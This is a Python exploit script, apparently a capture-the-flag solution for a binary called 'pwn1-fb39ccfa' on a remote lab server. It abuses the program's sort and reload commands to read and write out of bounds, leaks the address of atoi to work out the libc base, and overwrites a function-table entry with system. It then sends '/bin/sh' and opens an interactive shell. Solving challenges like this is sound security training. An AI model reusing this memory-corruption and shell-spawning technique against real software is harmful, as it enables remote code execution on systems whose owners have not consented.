#!/usr/bin/env python
# coding:utf-8

from ctf import *

elf = ELF('./pwn1-fb39ccfa')
libc = ELF('./libc.so')
# libc = ELF('/lib32/libc.so.6')

# io = process('./pwn1-fb39ccfa')
# io = remote('0.0.0.0', 4000)
io = remote('pwn.lab.seclover.com', 11111)
# io = debug('./pwn1-fb39ccfa')
# io.sendline('''
# '''.strip())
# io.r()

io.sendlineafter('_CMD_$', 'sort')
io.sendline(3)
io.sendlines(xrange(3))
io.sendline(7) # exit

io.sendlineafter('_CMD_$', 'clear')
io.sendlineafter('_CMD_$', 'sort')
io.sendline(32)
io.sendlines(xrange(32))
io.sendline(3) # sort
io.sendline(7) # exit

io.sendlineafter('_CMD_$', 'sort')
io.sendline(1)
io.sendlines(xrange(1))
io.sendlines([2, 1, 0x40000000])
io.sendline(7)

io.sendlineafter('_CMD_$', 'reload')
io.sendline(0)
io.sendlines([1, 0x4001])
io.recvuntil('[*L*] Query result:')
data_addr = int(io.recvline()) - 4
print hex(data_addr)
io.sendlines([2, 0x4007, 0x804d010])
io.sendline(7)

io.sendlineafter('_CMD_$', 'sort')
io.sendline(4)
io.sendline([elf.plt['memcpy'] + 6, elf.plt['strlen'] + 6, elf.plt['printf'] + 6, elf.plt['atoi'] + 6])

io.sendlines([1, 3])
io.recvuntil('[*L*] Query result:')
atoi_addr = int(io.recvline())
log.info('atoi address: %#x', atoi_addr)
libc_base = atoi_addr - libc.symbols['atoi']
system_addr = libc_base + libc.symbols['system']
log.info('system address: %#x', system_addr)

io.sendlines([2, 3, system_addr])
io.sendline('/bin/sh')

# io.interrupt()
# io.sendline('''
# # x/40xw *(int *)0x0804D090 + 0x10000 - 0x40
# x/40xw *(int *)0x0804D090
# x/8xw 0x804d010
# '''.strip())
io.interactive()
